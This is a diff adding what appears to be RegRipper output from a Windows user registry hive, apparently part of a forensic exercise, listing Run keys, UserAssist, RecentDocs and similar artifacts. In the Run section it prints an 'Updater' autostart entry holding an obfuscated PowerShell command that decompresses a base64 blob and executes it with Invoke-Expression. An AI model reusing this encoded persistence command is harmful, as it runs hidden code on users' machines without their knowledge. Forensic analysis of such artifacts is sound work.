@@ -1,0 +1,619 @@
+adobe v.20200522
+(NTUSER.DAT) Gets user's Adobe app cRecentFiles values
+
+Could not access Software\Adobe\Adobe Acrobat\\AVGeneral\cRecentFiles
+
+Could not access Software\Adobe\Acrobat Reader\\AVGeneral\cRecentFiles
+
+----------------------------------------
+allowedenum v.20200511
+(NTUSER.DAT, Software) Extracts AllowedEnumeration values to determine hidden special folders
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\AllowedEnumeration not found.
+Microsoft\Windows\CurrentVersion\Explorer\AllowedEnumeration not found.
+----------------------------------------
+appassoc v.20200515
+- Gets contents of user's ApplicationAssociationToasts key
+
+Software\Microsoft\Windows\CurrentVersion\ApplicationAssociationToasts not found.
+----------------------------------------
+appcompatflags v.20200525
+(NTUSER.DAT, Software) Extracts AppCompatFlags for Windows.
+
+
+Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted
+  C:\Users\admin\Desktop\BraveBrowserSetup.exe
+  C:\Users\admin\Desktop\AccessData_FTK_Imager_4.5.0_(x64).exe
+----------------------------------------
+appkeys v.20200517
+(NTUSER.DAT, Software) Extracts AppKeys entries.
+
+----------------------------------------
+applets v.20200525
+(NTUSER.DAT) Gets contents of user's Applets key
+
+Applets
+Software\Microsoft\Windows\CurrentVersion\Applets
+LastWrite Time 2023-05-25 02:50:21Z
+
+Software\Microsoft\Windows\CurrentVersion\Applets\Paint\Recent File List not found.
+
+Software\Microsoft\Windows\CurrentVersion\Applets\Regedit
+LastWrite Time 2023-05-25 03:55:27Z
+RegEdit LastKey value -> Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+----------------------------------------
+apppaths v.20200511
+(NTUSER.DAT,Software) Gets content of App Paths subkeys
+
+----------------------------------------
+Software\Microsoft\IntelliPoint\AppSpecific not found.
+----------------------------------------
+appx v.20200427
+(NTUSER.DAT, USRCLASS.DAT) Checks for persistence via Universal Windows Platform Apps
+
+----------------------------------------
+arpcache v.20200515
+(NTUSER.DAT) Retrieves CurrentVersion\App Management\ARPCache entries
+
+Software\Microsoft\Windows\CurrentVersion\App Management\ARPCache not found.
+----------------------------------------
+attachmgr v.20200525
+(NTUSER.DAT) Checks user's keys that manage the Attachment Manager functionality
+
+Software\Microsoft\Windows\CurrentVersion\Policies\Associations not found.
+
+Software\Microsoft\Windows\CurrentVersion\Policies\Attachments not found.
+
+----------------------------------------
+cached v.20200525
+(NTUSER.DAT) Gets cached Shell Extensions from NTUSER.DAT hive
+
+Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached
+LastWrite Time 2023-05-25 03:27:53Z
+
+2019-05-07 14:45:31Z  First Load: {D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D} (IShellIconOverlayIdentifier)
+2019-05-07 14:45:32Z  First Load: {4E77131D-3629-431C-9818-C5679DC83E81} (IShellIconOverlayIdentifier)
+2019-05-07 14:45:32Z  First Load: {08244EE6-92F0-47F2-9FC9-929BAA2E7235} (IShellIconOverlayIdentifier)
+2019-05-07 14:45:50Z  First Load: {DFFACDC5-679F-4156-8947-C5C76BC0B67F} (IDelegateFolder)
+2019-05-07 14:45:51Z  First Load: {896664F7-12E1-490F-8782-C0835AFD98FC} (IDelegateFolder)
+2019-05-07 14:45:53Z  First Load: {D34A6CA6-62C2-4C34-8A7C-14709C1AD938} (IDelegateFolder)
+2019-05-07 14:45:55Z  First Load: {871C5380-42A0-1069-A2EA-08002B30309D} (IShellFolder)
+2019-05-07 14:46:00Z  First Load: {C2B136E2-D50E-405C-8784-363C582BF43E} (IDelegateFolder)
+2019-05-07 14:46:01Z  First Load: {ED228FDF-9EA8-4870-83B1-96B02CFE0D52} (IShellFolder)
+2019-05-07 14:46:02Z  First Load: {1F3427C8-5C10-4210-AA03-2EE45287D668} (IShellFolder)
+2019-05-07 14:46:04Z  First Load: {F02C1A0D-BE21-4350-88B0-7367FC96EF3C} (IShellFolder)
+2019-05-07 14:46:05Z  First Load: {14074E0B-7216-4862-96E6-53CADA442A56} (IExtractIconW)
+2019-05-07 14:46:09Z  First Load: {2227A280-3AEA-1069-A2DE-08002B30309D} (IShellFolder)
+2019-05-07 14:47:15Z  First Load: {0BF754AA-C967-445C-AB3D-D8FDA9BAE7EF} (IContextMenu)
+2019-05-07 14:47:15Z  First Load: {F81E9010-6EA4-11CE-A7FF-00AA003CA9F6} (IContextMenu)
+2019-05-07 14:47:16Z  First Load: {7B4A83B6-F704-4B77-8E3D-C6087E3A21D2} (IExplorerCommandState)
+2019-05-07 14:47:16Z  First Load: {6B9228DA-9C15-419E-856C-19E768A13BDC} (IContextMenu)
+2019-05-07 14:47:45Z  First Load: {11DBB47C-A525-400B-9E80-A54615A090C0} (IExecuteCommand)
+2019-05-07 14:47:47Z  First Load: {35786D3C-B075-49B9-88DD-029876E11C01} (IDelegateFolder)
+2019-05-07 14:47:48Z  First Load: {9113A02D-00A3-46B9-BC5F-9C04DADDD5D7} (IDelegateFolder)
+2019-05-07 14:47:48Z  First Load: {B155BDF8-02F0-451E-9A26-AE317CFD7779} (IDelegateFolder)
+2019-05-07 14:47:48Z  First Load: {CC55EE92-FE67-43C9-95E7-E646918A4A04} (IExplorerCommand)
+2019-05-07 14:47:49Z  First Load: {2854F705-3548-414C-A113-93E27C808C85} (IContextMenu)
+2019-05-07 14:54:15Z  First Load: {9C73F5E5-7AE7-4E32-A8E8-8D23B85255BF} (IShellFolder)
+2019-05-07 14:58:26Z  First Load: {40DD6E20-7C17-11CE-A804-00AA003CA9F6} (IShellCopyHookW)
+2019-05-07 14:58:46Z  First Load: {7007ACC7-3202-11D1-AAD2-00805FC1270E} (IShellFolder)
+2019-05-07 14:59:01Z  First Load: {8E908FC9-BECC-40F6-915B-F4CA0E70D03D} (IShellFolder)
+2019-05-08 07:51:28Z  First Load: {4026492F-2F69-46B8-B9BF-5654FC07E423} (IShellFolder)
+2019-05-08 07:51:30Z  First Load: {1CD0938D-1AC1-49DE-AA04-F2C92D4A02D1} ({05B2F74E-2712-46BA-BCA3-F65A46BF0E00})
+2019-05-08 07:52:29Z  First Load: {DAF95313-E44D-46AF-BE1B-CBACEA2C3065} (IShellFolder)
+2019-05-08 07:52:29Z  First Load: {04731B67-D933-450A-90E6-4ACD2E9408FE} (IDelegateFolder)
+2020-05-31 22:52:29Z  First Load: {BD472F60-27FA-11CF-B8B4-444553540000} (IContextMenu)
+2020-05-31 22:52:31Z  First Load: {ED9D80B9-D157-457B-9192-0E7280313BF0} (IDropTarget)
+2020-05-31 22:52:31Z  First Load: {596AB062-B4D2-4215-9F74-E9109B0A8153} (IContextMenu)
+2020-05-31 22:52:31Z  First Load: {0A88C858-7D0C-4549-9499-7DB05F0CB0BF} (IExplorerCommand)
+2020-05-31 22:52:31Z  First Load: {1A0391BF-9564-4294-B0A4-06C298929EF9} (IExplorerCommand)
+2020-05-31 22:52:31Z  First Load: {474C98EE-CF3D-41F5-80E3-4AAB0AB04301} (IContextMenu)
+2020-05-31 22:52:31Z  First Load: {85BBD920-42A0-1069-A2E4-08002B30309D} (IContextMenu)
+2020-05-31 22:52:31Z  First Load: {B8CDCB65-B1BF-4B42-9428-1DFDB7EE92AF} (IContextMenu)
+2020-05-31 22:52:31Z  First Load: {888DCA60-FC0A-11CF-8F0F-00C04FD7D062} (IDropTarget)
+2020-05-31 22:52:31Z  First Load: {9E56BE61-C50F-11CF-9A2C-00A0C90A90CE} (IDropTarget)
+2020-05-31 22:52:31Z  First Load: {ECF03A32-103D-11D2-854D-006008059367} (IDropTarget)
+2020-05-31 22:52:31Z  First Load: {9E56BE60-C50F-11CF-9A2C-00A0C90A90CE} (IDropTarget)
+2020-05-31 22:52:35Z  First Load: {E88DCCE0-B7B3-11D1-A9F0-00AA0060FA31} (IShellFolder)
+2020-05-31 22:52:35Z  First Load: {2781761E-28E0-4109-99FE-B9D127C57AFE} ({56FFCC30-D398-11D0-B2AE-00A0C908FA49})
+2020-05-31 22:54:57Z  First Load: {BB06C0E4-D293-4F75-8A90-CB05B6477EEE} (IShellFolder)
+2023-03-16 04:46:46Z  First Load: {AEB16279-B750-48F1-8586-97956060175A} ({886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99})
+2023-03-16 04:46:59Z  First Load: {8082C5E6-4C27-48EC-A809-B8E1122E8F97} ({886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99})
+2023-03-16 04:46:59Z  First Load: {8082C5E6-4C27-48EC-A809-B8E1122E8F97} ({BB2E617C-0920-11D1-9A0B-00C04FC2D6C1})
+2023-03-16 04:54:36Z  First Load: {FF393560-C2A7-11CF-BFF4-444553540000} (IShellFolder)
+2023-03-16 04:55:21Z  First Load: {1D27F844-3A1F-4410-85AC-14651078412D} (IContextMenu)
+2023-05-25 02:21:50Z  First Load: {BD7A2E7B-21CB-41B2-A086-B309680C6B7E} (IShellFolder)
+2023-05-25 02:21:50Z  First Load: {9E175B8B-F52A-11D8-B9A5-505054503030} (IDBProperties)
+2023-05-25 02:21:50Z  First Load: {B2952B16-0E07-4E5A-B993-58C52CB94CAE} (IShellFolder)
+2023-05-25 02:21:50Z  First Load: {11016101-E366-4D22-BC06-4ADA335C892B} (IShellFolder)
+2023-05-25 02:52:52Z  First Load: {D20EA4E1-3957-11D2-A40B-0C5020524153} (IShellFolder)
+2023-05-25 02:52:52Z  First Load: {BD84B380-8CA2-1069-AB1D-08000948F534} (IShellFolder)
+2023-05-25 03:27:50Z  First Load: {7A80E4A8-8005-11D2-BCF8-00C04F72C717} (IExtractIconW)
+2023-05-25 03:27:53Z  First Load: {9343812E-1C37-4A49-A12E-4B2D810D956B} (IShellFolder)
+----------------------------------------
+cmdproc v.20200515
+(NTUSER.DAT) Autostart - get Command Processor\AutoRun value from NTUSER.DAT hive
+
+Software\Microsoft\Command Processor
+LastWrite Time 2019-05-07 14:45:30Z
+AutoRun value not found.
+----------------------------------------
+comdlg32 v.20200517
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32 not found.
+----------------------------------------
+compdesc v.20200511
+(NTUSER.DAT) Gets contents of user's ComputerDescriptions key
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\ComputerDescriptions not found.
+----------------------------------------
+DDO v.20140414
+(NTUSER.DAT) Gets user's DeviceDisplayObjects key contents
+
+Software\Microsoft\Windows NT\CurrentVersion\DeviceDisplayObjects not found.
+----------------------------------------
+disablemru v.20190924
+(NTUSER.DAT, Software) Checks settings disabling user's MRUs
+
+----------------------------------------
+environment v.20200512
+(System, NTUSER.DAT) Get environment vars from NTUSER.DAT & System hives
+
+Environment
+LastWrite Time: 2019-05-07 14:45:30Z
+
+TEMP                      %USERPROFILE%\AppData\Local\Temp                  
+TMP                       %USERPROFILE%\AppData\Local\Temp                  
+----------------------------------------
+featureusage v.20200511
+(NTUSER.DAT) Extracts user's FeatureUsage data.
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage not found.
+----------------------------------------
+[-] SOFTWARE\HeidiSQL not found.
+[-] SOFTWARE\HeidiSQL\Servers not found.
+
+----------------------------------------
+identities v.20200525
+(NTUSER.DAT) Extracts values from Identities key; NTUSER.DAT
+
+Identities
+LastWrite Time 2019-05-07 14:45:40Z
+
+Identity Ordinal                         1                             
+Migrated7                                1                             
+Last Username                            Main Identity                 
+Last User ID                             {EB2FE140-CF14-43A3-951D-05250E2F7FFB}
+Identity Login                           622675                        
+Default User ID                          {EB2FE140-CF14-43A3-951D-05250E2F7FFB}
+
+----------------------------------------
+injectdll64 v.20200427
+(NTUSER.DAT, Software) Retrieve values set to weaken Chrome security
+
+Software\Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls not found.
+Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls not found.
+----------------------------------------
+jumplistdata v.20200517
+Gets contents of user's JumpListData key
+
+Software\Microsoft\Windows\CurrentVersion\Search\JumpListData not found.
+----------------------------------------
+knowndev v.20200515
+(NTUSER.DAT) Gets user's KnownDevices key contents
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers\KnownDevices not found.
+----------------------------------------
+listsoft v.20200517
+(NTUSER.DAT) Lists contents of user's Software key
+
+List the contents of the Software key in the NTUSER.DAT hive
+file, in order by LastWrite time.
+
+2023-05-25 03:54:45Z 	AccessData
+2023-05-25 03:28:23Z 	Smart Projects
+2023-05-25 03:27:18Z 	Microsoft
+2023-03-16 04:55:22Z 	Google
+2023-03-16 04:55:21Z 	BraveSoftware
+2019-05-07 14:55:06Z 	VMware, Inc.
+2019-05-07 14:45:35Z 	AppDataLow
+2019-05-07 14:45:33Z 	Wow6432Node
+2019-05-07 14:45:30Z 	Policies
+----------------------------------------
+load v.20200517
+(NTUSER.DAT) Gets load and run values from user hive
+
+load
+Software\Microsoft\Windows NT\CurrentVersion\Windows
+LastWrite Time 2019-05-07 14:45:32Z
+
+load value not found.
+run value not found.
+----------------------------------------
+logonstats v.20200517
+Gets contents of user's LogonStats key
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\LogonStats not found.
+----------------------------------------
+lxss v.20200511
+(NTUSER.DAT) Gets WSL config.
+
+Software\Microsoft\Windows\CurrentVersion\Lxss not found.
+----------------------------------------
+mixer v.20200517
+(NTUSER.DAT) Checks user's audio mixer settings
+
+LastWrite Time, App, Device GUID
+2019-05-07 14:46:05Z,#,{9ab73357-69ca-46c1-b014-59092daaf786}
+----------------------------------------
+mmc v.20200517
+(NTUSER.DAT) Get contents of user's MMC\Recent File List key
+
+Software\Microsoft\Microsoft Management Console\Recent File List not found.
+----------------------------------------
+mmo v.20200517
+(NTUSER.DAT) Checks NTUSER for Multimedia\Other values [malware]
+
+Software\Microsoft\Multimedia\Other not found.
+Software\Microsoft\CTF\LangBarAddIn not found.
+----------------------------------------
+mndmru v.20200517
+(NTUSER.DAT) Get contents of user's Map Network Drive MRU
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU not found.
+----------------------------------------
+mp2 v.20200526
+(NTUSER.DAT) Gets user's MountPoints2 key contents
+
+MountPoints2
+Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
+LastWrite Time 2019-05-07 14:47:48Z
+
+Remote Drives:
+
+Volumes:
+2020-05-31 22:51:58Z
+  {2a1eb479-714b-11e9-92bd-806e6f6e6963}
+2019-05-07 14:47:48Z
+  {2a1eb476-714b-11e9-92bd-806e6f6e6963}
+
+Drives:
+2020-05-31 22:52:48Z - CPC
+
+Unique MAC Addresses:
+80:6E:6F:6E:69:63
+
+Analysis Tip: Correlate the Volume entries to those found in the MountedDevices
+entries that begin with "\??\Volume".
+----------------------------------------
+mpmru v.20200517
+(NTUSER.DAT) Gets user's Media Player RecentFileList values
+
+Software\Microsoft\MediaPlayer\Player\RecentFileList not found.
+----------------------------------------
+msoffice v.20200518
+
+----------------------------------------
+muicache v.20200525
+(NTUSER.DAT,USRCLASS.DAT) Gets EXEs from user's MUICache key
+
+Software\Microsoft\Windows\ShellNoRoam\MUICache not found.
+
+Local Settings\Software\Microsoft\Windows\Shell\MUICache not found.
+----------------------------------------
+nation v.20200517
+(ntuser.dat) Gets region information from HKCU
+
+Nation Information Check
+Control Panel\International\Geo
+LastWrite time: 2019-05-07 14:45:30Z
+
+The Region value is : 244
+The Country Is: United States
+For more information please visit the link below:
+https://msdn.microsoft.com/en-us/library/aa723531.aspx
+
+----------------------------------------
+oisc v.20091125
+(NTUSER.DAT) Gets contents of user's Office Internet Server Cache
+
+Office Version: 
+Software\Microsoft\Office\\Common\Internet\Server Cache not found.
+----------------------------------------
+onedrive v.20200515
+(NTUSER.DAT) Gets contents of user's OneDrive key
+
+Software\Microsoft\OneDrive not found.
+----------------------------------------
+OSVersion
+Software\Microsoft
+LastWrite Time 2023-05-25 03:27:18Z
+
+OSVersion value not found.
+----------------------------------------
+outlookhomepage v.20201002
+(NTUSER.DAT, Software) Retrieve values set to attack Outlook WebView Homepage
+
+Looking for webview homepage modifications. If this value is pointing
+to a URL outside the corporate domain it may be a malicious site.
+
+Looking for key values associated with security.
+If you see:
+[Example]  EnableRoamingFolderHomepages : 1
+[Example]  NonDefaultStoreScript : 1
+[Example]  EnableUnsafeClientMailRules : 1
+You may have a security vulnerability that allows attackers to hijack the URL
+
+----------------------------------------
+pendinggpos v.20200427
+NTUSER.DAT - Gets contents of user's PendingGPOs key
+
+Software\Microsoft\IEAK\GroupPolicy\PendingGPOs not found.
+----------------------------------------
+profiler v.20200525
+(NTUSER.DAT, System) Environment profiler information
+
+Environment
+LastWrite Time 2019-05-07 14:45:30Z
+
+TEMP -> %USERPROFILE%\AppData\Local\Temp
+TMP -> %USERPROFILE%\AppData\Local\Temp
+
+----------------------------------------
+pslogging v.20200515
+(NTUSER.DAT, Software) Extracts PowerShell logging settings
+
+Software\Policies\Microsoft\Windows\PowerShell not found.
+Policies\Microsoft\Windows\PowerShell not found.
+----------------------------------------
+----------------------------------------
+putty v.20200515
+(NTUSER.DAT) Extracts the saved SshHostKeys for PuTTY.
+
+Software\SimonTatham\PuTTY\SshHostKeys not found.
+
+----------------------------------------
+recentapps v.20200515
+- Gets contents of user's RecentApps key
+
+Software\Microsoft\Windows\CurrentVersion\Search\RecentApps not found.
+----------------------------------------
+recentdocs v.20200427
+(NTUSER.DAT) Gets contents of user's RecentDocs key
+
+RecentDocs
+**All values printed in MRUList\MRUListEx order.
+Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
+LastWrite Time: 2023-05-25 02:29:22Z
+  0 = New Text Document.txt
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt
+LastWrite Time 2023-05-25 02:29:22Z
+MRUListEx = 0
+  0 = New Text Document.txt
+
+----------------------------------------
+run v.20200511
+(Software, NTUSER.DAT) [Autostart] Get autostart key contents from Software hive
+
+Software\Microsoft\Windows\CurrentVersion\Run
+LastWrite Time 2023-05-25 03:55:25Z
+  Updater - "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon"
+
+Software\Microsoft\Windows\CurrentVersion\Run has no subkeys.
+
+Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run not found.
+
+Software\Microsoft\Windows\CurrentVersion\RunOnce
+LastWrite Time 2019-05-07 14:46:04Z
+Software\Microsoft\Windows\CurrentVersion\RunOnce has no values.
+Software\Microsoft\Windows\CurrentVersion\RunOnce has no subkeys.
+
+Software\Microsoft\Windows\CurrentVersion\RunServices not found.
+
+Software\Microsoft\Windows\CurrentVersion\RunServicesOnce not found.
+
+Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run not found.
+
+Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce not found.
+
+Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run not found.
+
+Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run not found.
+
+Software\Microsoft\Windows\CurrentVersion\StartupApproved\Run not found.
+
+Software\Microsoft\Windows\CurrentVersion\StartupApproved\Run32 not found.
+
+Software\Microsoft\Windows\CurrentVersion\StartupApproved\StartupFolder not found.
+
+----------------------------------------
+runmru v.20200525
+(NTUSER.DAT) Gets contents of user's RunMRU key
+
+RunMru
+Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+LastWrite Time 2023-05-25 03:19:31Z
+MRUList = ba
+a   winver\1
+b   regedit\1
+----------------------------------------
+runvirtual v.20200427
+(NTUSER.DAT, Software) Gets RunVirtual entries
+
+----------------------------------------
+searchscopes v.20200517
+- Gets contents of user's SearchScopes key
+
+SearchScopes
+Software\Microsoft\Internet Explorer\SearchScopes
+DefaultScope: {0633EE93-D776-472f-A0FF-E1416B8B2E3A}
+
+Software\Microsoft\Internet Explorer\SearchScopes has no subkeys.
+----------------------------------------
+sevenzip v.20210329
+- Gets records of histories from 7-Zip keys
+
+Software\7-Zip not found.
+Software\Wow6432Node\7-Zip not found.
+----------------------------------------
+shc v.20200427
+(NTUSER.DAT) Gets SHC entries from user hive
+
+Software\Microsoft\Windows\CurrentVersion\UFH\SHC not found.
+----------------------------------------
+shellfolders v.20200515
+Gets user's shell folders values
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+LastWrite Time 2019-05-07 14:45:51Z
+StartUp folder : C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+LastWrite Time 2019-05-07 14:45:30Z
+StartUp folder : %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+----------------------------------------
+speech v.20200427
+(NTUSER.DAT) Get values from user's Speech key
+
+Software\Microsoft\Speech
+----------------------------------------
+Software\SysInternals not found.
+----------------------------------------
+Launching tsclient v.20200518
+(NTUSER.DAT) Displays contents of user's Terminal Server Client\Default key
+
+Software\Microsoft\Terminal Server Client\Default not found.
+
+Software\Microsoft\Terminal Server Client\Servers not found.
+----------------------------------------
+typedpaths v.20200526
+(NTUSER.DAT) Gets contents of user's typedpaths key
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
+LastWrite Time 2019-05-07 14:58:31Z
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths has no values.
+----------------------------------------
+typedurls v.20200526
+(NTUSER.DAT) Returns contents of user's TypedURLs key.
+
+TypedURLs
+Software\Microsoft\Internet Explorer\TypedURLs
+LastWrite Time 2023-03-16 04:54:35Z
+  url1 -> http://google.com/
+  url2 -> http://go.microsoft.com/fwlink/?LinkId=69157
+----------------------------------------
+typedurlstime v.20200526
+(NTUSER.DAT) Returns contents of user's TypedURLsTime key.
+
+Software\Microsoft\Internet Explorer\TypedURLsTime not found.
+----------------------------------------
+uninstall v.20200525
+(Software, NTUSER.DAT) Gets contents of Uninstall keys from Software, NTUSER.DAT hives
+
+Uninstall
+----------------------------------------
+UserAssist
+Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
+LastWrite Time 2019-05-07 14:46:01Z
+
+{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
+2023-05-25 03:55:33Z
+  {6D809377-6AF0-444B-8957-A3773F02200E}\AccessData\FTK Imager\FTK Imager.exe (1)
+2023-05-25 03:54:15Z
+  {F38BF404-1D43-42F2-9305-67DE0B28FC23}\regedit.exe (8)
+2023-05-25 03:54:09Z
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\reg.exe (2)
+2023-05-25 03:52:14Z
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\cmd.exe (14)
+2023-05-25 03:26:49Z
+  C:\Users\admin\Desktop\AccessData_FTK_Imager_4.5.0_(x64).exe (1)
+2023-05-25 03:26:26Z
+  {F38BF404-1D43-42F2-9305-67DE0B28FC23}\explorer.exe (3)
+2023-05-25 02:54:12Z
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe (2)
+2023-05-25 02:29:22Z
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\NOTEPAD.EXE (2)
+2023-03-16 04:53:58Z
+  Microsoft.Windows.MediaPlayer32 (1)
+  Microsoft.InternetExplorer.Default (1)
+2023-03-16 04:52:48Z
+  C:\Users\admin\Desktop\BraveBrowserSetup.exe (1)
+2020-05-31 22:52:41Z
+  C:\Users\admin\Desktop\Windows Loader 2.2.2\Windows Loader.exe (1)
+2019-05-07 14:58:33Z
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\winver.exe (1)
+2019-05-07 14:48:25Z
+  D:\setup64.exe (1)
+2019-05-07 14:44:13Z
+  Microsoft.Windows.GettingStarted (14)
+  Microsoft.Windows.MediaCenter (13)
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\calc.exe (12)
+  Microsoft.Windows.StickyNotes (11)
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\SnippingTool.exe (10)
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\mspaint.exe (9)
+  Microsoft.Windows.RemoteDesktop (8)
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\magnify.exe (7)
+  {6D809377-6AF0-444B-8957-A3773F02200E}\Microsoft Games\Solitaire\solitaire.exe (6)
+
+Value names with no time stamps:
+  UEME_CTLCUACount:ctor
+  Microsoft.Windows.WindowsInstaller
+  Microsoft.Windows.Shell.RunDialog
+  Microsoft.Windows.ControlPanel
+  {7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}\BraveSoftware\Temp\GUM11EA.tmp\BraveUpdate.exe
+  {7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}\BraveSoftware\Update\BraveUpdate.exe
+  Brave
+  C:\Users\admin\AppData\Local\Temp\{4349F8DE-53EB-4261-9AB5-3C32E684AC89}\AccessData_FTK_Imager_4.5.0_(x64).exe
+
+{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}
+2023-05-25 03:55:33Z
+  C:\Users\Public\Desktop\AccessData FTK Imager.lnk (1)
+2023-05-25 03:26:26Z
+  {9E3995AB-1F9C-4F13-B827-48B24B6C7174}\TaskBar\Windows Explorer.lnk (3)
+2023-05-25 02:54:12Z
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Windows PowerShell\Windows PowerShell.lnk (2)
+2023-03-16 04:53:58Z
+  {9E3995AB-1F9C-4F13-B827-48B24B6C7174}\TaskBar\Windows Media Player.lnk (1)
+  {9E3995AB-1F9C-4F13-B827-48B24B6C7174}\TaskBar\Internet Explorer.lnk (1)
+2019-05-07 14:44:13Z
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Welcome Center.lnk (14)
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Media Center.lnk (13)
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Calculator.lnk (12)
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Sticky Notes.lnk (11)
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Snipping Tool.lnk (10)
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Paint.lnk (9)
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Remote Desktop Connection.lnk (8)
+  {A77F5D77-2E2B-44C3-A6A2-ABA601054A51}\Accessories\Accessibility\Magnify.lnk (7)
+  ::{ED228FDF-9EA8-4870-83B1-96B02CFE0D52}\{00D8862B-6453-4957-A821-3D98D74C76BE} (6)
+
+Value names with no time stamps:
+  UEME_CTLCUACount:ctor
+
+----------------------------------------
+wc_shares v.20200515
+- Gets contents of user's WorkgroupCrawler/Shares subkeys
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares not found.
+----------------------------------------
+winrar v.20200526
+(NTUSER.DAT) Get WinRAR\ArcHistory entries
+
+Software\WinRAR\ArcHistory not found.
+----------------------------------------
+winscp v.20201227
+(NTUSER.DAT) Gets user's WinSCP 2 data
+
+Software\Martin Prikryl\WinSCP 2 not found.
+----------------------------------------
+winzip v.20200526
+(NTUSER.DAT) Get WinZip extract and filemenu values
+
+Software\Nico Mak Computing\WinZip not found.
+----------------------------------------
+wordwheelquery v.20200823
+(NTUSER.DAT) Gets contents of user's WordWheelQuery key
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery not found.
+----------------------------------------
